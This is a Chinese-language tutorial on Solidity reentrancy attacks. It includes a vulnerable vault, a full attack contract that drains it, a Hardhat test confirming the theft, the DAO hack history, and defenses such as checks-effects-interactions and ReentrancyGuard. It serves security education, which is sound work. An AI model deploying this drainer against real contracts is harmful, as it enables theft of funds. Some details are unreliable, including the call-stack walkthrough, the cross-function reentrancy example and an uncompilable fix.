# 重入攻击完全指南

> 💀 智能合约最经典、最危险的漏洞之一

⏱️ **学习时间**: 2-3小时  
⭐ **重要程度**: ⭐⭐⭐⭐⭐

---

## 🎯 学习目标

学完本节后，你将：
- ✅ 深刻理解重入攻击原理
- ✅ 能识别代码中的重入漏洞
- ✅ 掌握多种防御措施
- ✅ 理解 ReentrancyGuard 的实现原理
- ✅ 能编写攻击合约（用于测试）

---

## 📚 目录

1. [重入攻击原理](#1-重入攻击原理)
2. [The DAO 攻击案例](#2-the-dao-攻击案例)
3. [防御措施](#3-防御措施)
4. [ReentrancyGuard 原理](#4-reentrancyguard-原理)
5. [实战演练](#5-实战演练)

---

## 1. 重入攻击原理

### 💡 什么是重入攻击？

**简单类比**：
```
想象一个银行取款场景：

正常流程：
1. 你去柜台取钱
2. 柜员检查余额 ✅
3. 柜员给你现金 💰
4. 柜员在系统中扣除余额 📝

重入攻击：
1. 你去柜台取钱
2. 柜员检查余额 ✅
3. 柜员给你现金 💰
4. 你在柜员更新系统前，立刻排队再次取钱！⚡
5. 柜员检查余额 ✅（还没扣！）
6. 柜员再次给你现金 💰
7. 重复...直到银行被掏空！💸
```

**技术定义**：当合约在更新状态之前进行外部调用时，攻击者利用外部调用的机会，在状态更新前再次调用同一函数，导致状态不一致。

### 🔍 脆弱的合约示例

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Vault {
    // 内部账户
    mapping(address => uint256) public balances;

    /// @notice 存款函数
    function deposit() public payable {
        // 检测传入的金额是否大于0
        require(msg.value > 0, "value is not zero");
        // 将钱存入其中，并且更新余额
        balances[msg.sender] += msg.value;
    }

    /// @notice 提款函数 ❌ 存在重入漏洞！
    function withdraw(uint256 amount) public {
        uint256 userBalance = balances[msg.sender];
        
        // 检测账户余额是否大于amount
        require(balances[msg.sender] > amount, "the account is not enough");
        
        // ❌ 问题1：先转账
        // call是低级调用，如果失败了不会自动回滚
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "tx is failed");
        
        // ❌ 问题2：后更新余额
        balances[msg.sender] = userBalance - amount;
        
        // 注意：如果用 balances[msg.sender] -= amount; 
        // 会触发整数下溢检查，导致回滚
    }
}
```

**为什么有漏洞？**
1. ❌ **先转账**：`msg.sender.call{value: amount}("")` 会触发接收方的 `receive` 或 `fallback` 函数
2. ❌ **后更新状态**：`balances[msg.sender]` 在转账后才更新
3. ⚠️ **攻击窗口**：在转账和更新余额之间，攻击者可以再次调用 `withdraw`

### 💣 攻击合约

```solidity
/// @title 攻击合约
contract Attack {
    Vault public immutable vault; // 使用 immutable 更节省 gas
    uint256 public constant ATTACK_AMOUNT = 1 ether; // 定义一个常量，方便管理

    constructor(address _vaultAddress) {
        vault = Vault(_vaultAddress);
    }

    /// @notice 攻击入口函数，调用时需发送 ATTACK_AMOUNT 的以太币
    function attack() public payable {
        // 确保发送的金额与我们计划提款的金额一致
        require(msg.value == ATTACK_AMOUNT, "Must send ATTACK_AMOUNT to start the attack");
        
        // 1. 存入资金，获得提款资格
        vault.deposit{value: ATTACK_AMOUNT}();

        // 2. 发起第一次提款，这将触发重入
        vault.withdraw(ATTACK_AMOUNT);
    }

    /// @notice 这是重入攻击的核心。当 Vault 发送以太币时，这个函数会被调用。
    receive() external payable { 
        // 检查 Vault 合约是否还有足够的钱可以偷
        // 如果 Vault 的总余额还够我们再取一次，就继续攻击
        if (address(vault).balance >= ATTACK_AMOUNT) {
            // 在 Vault 更新我们的余额记录之前，再次调用 withdraw
            vault.withdraw(ATTACK_AMOUNT);
        }
    }
    
    /// @notice 方便攻击者在攻击完成后，将盗取的资金取回
    function drainFunds() public {
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "Failed to drain funds");
    }
}
```

### 🔄 攻击流程详解

**调用栈分析**（假设 Vault 中已有 2 ETH，攻击者存入 1 ETH）：

```
初始状态：
├─ Vault.balance = 3 ETH
├─ balances[Attack] = 1 ETH
└─ Attack.balance = 0 ETH

执行流程：

1️⃣ Attack.attack() 
   └─> Vault.withdraw(1 ether) [第1次调用]
       ├─ require(balances[Attack] > 1 ether) ✅ (1 > 1? false，但这里代码有bug)
       ├─ msg.sender.call{value: 1 ether}
       │  └─> 触发 Attack.receive()
       │      ├─ address(vault).balance >= 1 ether? ✅ (2 ETH >= 1 ETH)
       │      └─> Vault.withdraw(1 ether) [第2次调用！重入！]
       │          ├─ require(balances[Attack] > 1 ether) ✅ (余额还没更新！)
       │          ├─ msg.sender.call{value: 1 ether}
       │          │  └─> 触发 Attack.receive()
       │          │      ├─ address(vault).balance >= 1 ether? ✅ (1 ETH >= 1 ETH)
       │          │      └─> Vault.withdraw(1 ether) [第3次调用！]
       │          │          ├─ require(balances[Attack] > 1 ether) ✅
       │          │          ├─ msg.sender.call{value: 1 ether}
       │          │          │  └─> 触发 Attack.receive()
       │          │          │      └─ address(vault).balance >= 1 ether? ❌ (0 ETH < 1 ETH)
       │          │          │      └─ 停止重入
       │          │          └─ balances[Attack] = 0 ⚠️ [第3次更新]
       │          └─ balances[Attack] = 0 - 1 ⚠️ [第2次更新，下溢！]
       └─ balances[Attack] = 0 - 1 ⚠️ [第1次更新，下溢！]

结果：
├─ Vault.balance = 0 ETH（被掏空！）
├─ Attack.balance = 3 ETH（偷了3个ETH）
└─ 攻击成功！用1 ETH的余额，提取了3 ETH！
```

**关键点**：
- 📌 **调用栈回退**：后进先出（LIFO），从最内层开始返回
- 📌 **状态未更新**：在重入时，`balances[Attack]` 始终是 1 ETH
- 📌 **单线程执行**：Solidity 是单线程的，代码按顺序执行

### 📊 数学分析

**假设**：
- Vault 中有 `V` ETH
- 攻击者存入 `A` ETH  
- 每次提取 `A` ETH

**攻击次数** = `floor((V + A) / A)` 次

**示例**：
- V = 2 ETH, A = 1 ETH → 攻击 3 次，提取 3 ETH ✅
- V = 10 ETH, A = 1 ETH → 攻击 11 次，提取 11 ETH
- V = 5 ETH, A = 2 ETH → 攻击 3 次，提取 6 ETH

---

## 2. The DAO 攻击案例

### 📜 历史背景

**The DAO** (Decentralized Autonomous Organization) 是以太坊历史上最著名的黑客事件：

- 📅 **时间**：2016年6月17日
- 💰 **损失**：360万 ETH（当时约6000万美元，现在价值数十亿美元）
- 🎯 **攻击方式**：重入攻击
- 💥 **影响**：导致以太坊硬分叉，产生了 ETH 和 ETC 两条链

### 🏗️ The DAO 项目简介

The DAO 是一个去中心化的投资基金：
- 用户存入 ETH，获得 DAO 代币
- 代币持有者可以投票决定投资哪些项目
- 用户可以通过 `splitDAO` 函数退出，拿回资金

### 🔍 漏洞代码（简化版）

```solidity
contract TheDAO {
    mapping(address => uint256) public balances;
    
    // 存款
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    // 退出 - splitDAO 的简化版
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        
        // ❌ 没有余额检查
        
        // ❌ 先转账
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // ❌ 后更新状态
        balances[msg.sender] = 0;
    }
}
```

### 💣 攻击过程

1. **攻击者**创建恶意合约，存入少量 ETH
2. **调用** `withdraw()` 函数
3. **触发** `receive()` 函数，重入调用 `withdraw()`
4. **重复** 直到 The DAO 余额耗尽
5. **结果**：360万 ETH 被盗

### 🌍 后续影响

**社区分裂**：
- **以太坊硬分叉**：回滚交易，恢复被盗资金 → **ETH**（Ethereum）
- **反对者**：保持原链，不回滚 → **ETC**（Ethereum Classic）

**争议**：
- ✅ **支持者**：保护用户资金，维护信任
- ❌ **反对者**：违背"代码即法律"，破坏不可篡改性

**教训**：
1. 智能合约安全至关重要
2. 代码审计必不可少
3. 需要建立安全最佳实践

---

## 3. 防御措施

### 🛡️ 方法一：检查-生效-交互模式（CEI Pattern）⭐⭐⭐

**最重要的防御模式！**

```solidity
contract SafeVault {
    mapping(address => uint256) public balances;
    
    function withdraw(uint256 amount) public {
        // ✅ Step 1: Checks（检查）
        require(amount > 0, "Amount must be greater than 0");
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // ✅ Step 2: Effects（生效 - 更新状态）
        balances[msg.sender] -= amount;
        
        // ✅ Step 3: Interactions（交互 - 外部调用）
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```

**为什么有效？**
- 在外部调用前，状态已经更新
- 即使重入，`balances[msg.sender]` 已经减少
- 第二次调用时，余额不足，`require` 会失败 ✅

**CEI 模式的本质**：
```
Checks（检查）   → 验证所有条件
Effects（生效）  → 更新所有状态
Interactions（交互）→ 调用外部合约
```

### 🛡️ 方法二：ReentrancyGuard 修饰符 ⭐⭐⭐

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SafeVault is ReentrancyGuard {
    mapping(address => uint256) public balances;
    
    // 使用 nonReentrant 修饰符
    function withdraw(uint256 amount) public nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // 即使先调用后更新，也是安全的
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= amount;
    }
}
```

**优点**：
- ✅ 简单易用，一行代码解决
- ✅ 经过审计，安全可靠
- ✅ Gas 成本较低

**缺点**：
- ⚠️ 需要引入外部库
- ⚠️ 增加一些 Gas 消耗

### 🛡️ 方法三：拉取而非推送模式

```solidity
contract PullPayment {
    mapping(address => uint256) public pendingWithdrawals;
    
    // 其他函数设置 pendingWithdrawals
    function addPending(address user, uint256 amount) internal {
        pendingWithdrawals[user] += amount;
    }
    
    // 用户主动拉取（pull）
    function withdraw() public {
        uint256 amount = pendingWithdrawals[msg.sender];
        require(amount > 0, "No pending withdrawal");
        
        // CEI 模式
        pendingWithdrawals[msg.sender] = 0;
        
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "Transfer failed");
    }
}

// ❌ 避免推送模式（push）
contract PushPayment {
    function distribute(address[] memory users, uint256[] memory amounts) public {
        for (uint i = 0; i < users.length; i++) {
            // 危险！如果某个 user 是恶意合约，可能重入
            users[i].call{value: amounts[i]}("");
        }
    }
}
```

**拉取模式的优势**：
- ✅ 用户自己控制何时提款
- ✅ 失败不影响其他用户
- ✅ 避免批量转账的重入风险

### 🛡️ 方法四：使用 `transfer` 或 `send`（不推荐）

```solidity
// ⚠️ 过时的方法，不推荐
function withdraw(uint256 amount) public {
    require(balances[msg.sender] >= amount);
    
    balances[msg.sender] -= amount;
    
    // transfer 只给 2300 gas，理论上无法重入
    payable(msg.sender).transfer(amount);
}
```

**为什么不推荐？**
- ⚠️ 2300 gas 限制可能在未来失效（EIP-1884）
- ⚠️ 接收方可能无法处理（如多签钱包）
- ⚠️ 依赖于 gas 成本假设，不够稳健

**推荐做法**：使用 `call` + CEI 模式 或 ReentrancyGuard

### 📋 防御措施对比

| 方法 | 安全性 | 易用性 | Gas成本 | 推荐度 |
|------|--------|--------|---------|--------|
| CEI 模式 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| ReentrancyGuard | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| 拉取模式 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| transfer/send | ⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐ |

**最佳实践**：CEI 模式 + ReentrancyGuard 双重保险

---

## 4. ReentrancyGuard 原理

### 🔍 OpenZeppelin 实现

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract ReentrancyGuard {
    // 状态变量：记录是否正在执行
    uint256 private _status;
    
    // 常量：未进入状态
    uint256 private constant _NOT_ENTERED = 1;
    
    // 常量：已进入状态
    uint256 private constant _ENTERED = 2;
    
    constructor() {
        _status = _NOT_ENTERED;
    }
    
    /**
     * @dev 防止重入的修饰符
     */
    modifier nonReentrant() {
        // 检查：如果已经进入，拒绝调用
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        
        // 上锁：设置为已进入状态
        _status = _ENTERED;
        
        // 执行函数体
        _;
        
        // 解锁：恢复为未进入状态
        _status = _NOT_ENTERED;
    }
}
```

### 🔐 工作原理

**第一次调用**：
```
1. 进入 withdraw()
2. nonReentrant 检查：_status == _NOT_ENTERED ✅
3. 设置 _status = _ENTERED（上锁）
4. 执行函数体：转账，触发 receive()
5. 尝试重入...
```

**重入调用（失败）**：
```
6. 再次进入 withdraw()
7. nonReentrant 检查：_status == _ENTERED ❌
8. require 失败，交易 revert
9. 攻击失败！
```

**正常返回**：
```
10. 返回第一次调用
11. 执行完毕
12. 设置 _status = _NOT_ENTERED（解锁）
```

### 💡 为什么用 1 和 2，而不是 0 和 1？

```solidity
// ❌ 如果用 0 和 1
uint256 private _status = 0;  // 初始化为 0

// ✅ OpenZeppelin 用 1 和 2
uint256 private _status = 1;  // 初始化为 1
```

**原因**：Gas 优化！
- 状态变量从 0 改为非 0：消耗 20,000 gas（SSTORE）
- 状态变量从非 0 改为非 0：消耗 5,000 gas
- 第一次调用时，从 1 → 2 → 1，都是非 0 值，节省 gas

### 📊 Gas 成本分析

```solidity
// 使用 ReentrancyGuard
function withdraw() public nonReentrant {
    // 额外 Gas 成本：
    // - 第一次 SLOAD: ~2,100 gas
    // - SSTORE (1 → 2): ~5,000 gas
    // - SSTORE (2 → 1): ~5,000 gas
    // 总计：~12,100 gas
}

// 不使用 ReentrancyGuard
function withdraw() public {
    // 无额外成本
}
```

**结论**：ReentrancyGuard 增加约 12,000 gas，但安全性大幅提升，非常值得！

### ⚠️ 注意事项

#### 1. 跨函数重入

```solidity
contract Vulnerable is ReentrancyGuard {
    mapping(address => uint256) public balances;
    
    // ✅ 有保护
    function withdraw() public nonReentrant {
        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).call{value: amount}("");
    }
    
    // ❌ 没有保护！可以从这里重入到 withdraw
    function transfer(address to, uint256 amount) public {
        balances[msg.sender] -= amount;
        balances[to] += amount;
        // 如果 to 是恶意合约，可以在这里重入 withdraw！
    }
}
```

**解决方案**：所有有外部调用的函数都加 `nonReentrant`

```solidity
function withdraw() public nonReentrant { ... }
function transfer(address to, uint256 amount) public nonReentrant { ... }
```

#### 2. 跨合约重入

```solidity
contract ContractA is ReentrancyGuard {
    ContractB public contractB;
    
    function functionA() public nonReentrant {
        // 调用 ContractB
        contractB.functionB();
    }
}

contract ContractB {
    // 可以重入回 ContractA 的其他函数！
    function functionB() public {
        // 攻击代码
    }
}
```

**注意**：ReentrancyGuard 只防止同一个合约内的重入！

---

## 5. 实战演练

### 🎯 练习 1：识别漏洞

找出以下合约的漏洞：

```solidity
contract Bank {
    mapping(address => uint256) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        payable(msg.sender).transfer(amount);
        balances[msg.sender] -= amount;
    }
    
    function getBalance() public view returns (uint256) {
        return balances[msg.sender];
    }
}
```

<details>
<summary>💡 点击查看答案</summary>

**分析**：
- ✅ 使用了 `transfer`（2300 gas 限制）
- ✅ 有余额检查
- ⚠️ 没有遵循 CEI 模式（先转账后更新）

**是否安全？**
- 目前相对安全（因为 `transfer` 的 gas 限制）
- 但不是最佳实践（依赖 gas 假设）
- 未来可能不安全（如果 gas 成本变化）

**改进建议**：
```solidity
function withdraw(uint256 amount) public {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    
    // ✅ CEI 模式：先更新状态
    balances[msg.sender] -= amount;
    
    // ✅ 使用 call 而非 transfer
    (bool success, ) = payable(msg.sender).call{value: amount}("");
    require(success, "Transfer failed");
}
```
</details>

### 🎯 练习 2：编写攻击合约

为本文开头的 `Vault` 合约编写完整的测试，包括：
1. 部署 Vault 合约
2. 部署 Attack 合约
3. 执行攻击
4. 验证攻击成功

**测试框架**（Hardhat）：

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Reentrancy Attack Test", function () {
    let vault, attack;
    let deployer, attacker, victim;

    beforeEach(async function () {
        [deployer, attacker, victim] = await ethers.getSigners();

        // 部署 Vault
        const Vault = await ethers.getContractFactory("Vault");
        vault = await Vault.deploy();
        
        // Victim 存入 2 ETH
        await vault.connect(victim).deposit({ value: ethers.parseEther("2") });

        // 部署 Attack 合约
        const Attack = await ethers.getContractFactory("Attack");
        attack = await Attack.connect(attacker).deploy(await vault.getAddress());
    });

    it("应该成功执行重入攻击", async function () {
        // 记录初始余额
        const vaultBalanceBefore = await ethers.provider.getBalance(await vault.getAddress());
        const attackBalanceBefore = await ethers.provider.getBalance(await attack.getAddress());
        
        console.log("攻击前 Vault 余额:", ethers.formatEther(vaultBalanceBefore), "ETH");
        console.log("攻击前 Attack 余额:", ethers.formatEther(attackBalanceBefore), "ETH");

        // 执行攻击（发送 1 ETH）
        await attack.connect(attacker).attack({ value: ethers.parseEther("1") });

        // 记录攻击后余额
        const vaultBalanceAfter = await ethers.provider.getBalance(await vault.getAddress());
        const attackBalanceAfter = await ethers.provider.getBalance(await attack.getAddress());
        
        console.log("攻击后 Vault 余额:", ethers.formatEther(vaultBalanceAfter), "ETH");
        console.log("攻击后 Attack 余额:", ethers.formatEther(attackBalanceAfter), "ETH");

        // 验证攻击成功
        expect(vaultBalanceAfter).to.equal(0); // Vault 被掏空
        expect(attackBalanceAfter).to.equal(ethers.parseEther("3")); // Attack 获得 3 ETH
    });

    it("提取被盗资金", async function () {
        // 执行攻击
        await attack.connect(attacker).attack({ value: ethers.parseEther("1") });
        
        // 攻击者提取资金
        const attackerBalanceBefore = await ethers.provider.getBalance(attacker.address);
        await attack.connect(attacker).drainFunds();
        const attackerBalanceAfter = await ethers.provider.getBalance(attacker.address);
        
        // 验证攻击者获利（忽略 gas 费用）
        expect(attackerBalanceAfter - attackerBalanceBefore).to.be.closeTo(
            ethers.parseEther("3"),
            ethers.parseEther("0.01") // 允许 0.01 ETH 的 gas 误差
        );
    });
});
```

### 🎯 练习 3：修复漏洞

用三种方法修复 `Vault` 合约：

**方法 1：CEI 模式**
```solidity
function withdraw(uint256 amount) public {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    
    // ✅ Effects: 先更新状态
    balances[msg.sender] -= amount;
    
    // ✅ Interactions: 后外部调用
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
```

**方法 2：ReentrancyGuard**
```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SafeVault is ReentrancyGuard {
    mapping(address => uint256) public balances;
    
    function withdraw(uint256 amount) public nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= amount;
    }
}
```

**方法 3：拉取模式**
```solidity
contract SafeVault {
    mapping(address => uint256) public pendingWithdrawals;
    
    function requestWithdrawal(uint256 amount) public {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;
        pendingWithdrawals[msg.sender] += amount;
    }
    
    function withdraw() public {
        uint256 amount = pendingWithdrawals[msg.sender];
        require(amount > 0);
        
        pendingWithdrawals[msg.sender] = 0;
        payable(msg.sender).call{value: amount}("");
    }
}
```

### 🎯 练习 4：在线挑战

完成以下在线安全挑战：

1. **Ethernaut - Level 10: Reentrancy** ⭐⭐⭐⭐⭐
   - 链接：https://ethernaut.openzeppelin.com/level/10
   - 难度：中等
   - 目标：盗取合约的所有资金

2. **Damn Vulnerable DeFi - Side Entrance** ⭐⭐⭐⭐
   - 链接：https://www.damnvulnerabledefi.xyz/challenges/side-entrance/
   - 难度：中等
   - 目标：利用闪电贷 + 重入攻击

3. **Capture the Ether - Token Bank** ⭐⭐⭐
   - 链接：https://capturetheether.com/challenges/
   - 难度：中等

---

## ✅ 学习检查清单

完成本节后，确认你已经：

### 理论理解
- [ ] 能用自己的话解释什么是重入攻击
- [ ] 理解重入攻击的原理（调用栈回退）
- [ ] 知道 The DAO 攻击的历史和影响
- [ ] 理解为什么 Solidity 不自动防止重入

### 代码能力
- [ ] 能识别代码中的重入漏洞
- [ ] 能编写攻击合约（用于测试）
- [ ] 能用 CEI 模式修复漏洞
- [ ] 会使用 ReentrancyGuard
- [ ] 理解拉取模式的应用场景

### 实战经验
- [ ] 完成了本地测试（Hardhat/Foundry）
- [ ] 完成了至少 1 个在线挑战
- [ ] 用 Slither 扫描过自己的代码
- [ ] 能向他人讲解重入攻击

---

## 📚 参考资源

### 官方文档
- [SWC-107: Reentrancy](https://swcregistry.io/docs/SWC-107)
- [Consensys Best Practices: Reentrancy](https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/)
- [OpenZeppelin ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)

### 经典文章
- [The DAO Hack Explained](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/)
- [Solidity: Reentrancy Attack](https://solidity-by-example.org/hacks/re-entrancy/)
- [Secureum: Reentrancy Pitfalls](https://secureum.substack.com/)

### 视频教程
- [Smart Contract Programmer: Reentrancy Attack](https://www.youtube.com/watch?v=4Mm3BCyHtDY) ⭐⭐⭐⭐⭐
- [Patrick Collins: Security Course](https://www.youtube.com/@PatrickCollins)

### 在线挑战
- [Ethernaut by OpenZeppelin](https://ethernaut.openzeppelin.com/)
- [Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/)
- [Capture the Ether](https://capturetheether.com/)

### 真实案例
- [Rekt News](https://rekt.news/) - 真实攻击事件分析
- [Blockchain Graveyard](https://magoo.github.io/Blockchain-Graveyard/)

---

## 💡 下一步

学完重入攻击后，继续学习：

1. **整数溢出** → `02-整数溢出/`
2. **访问控制** → `03-访问控制/`
3. **审计工具** → `8.2-审计工具基础/`
4. **OpenZeppelin** → `05-智能合约库深入篇/` （现在能理解 ReentrancyGuard 了！）

---

**Security first! 永远把安全放在第一位！** 🛡️


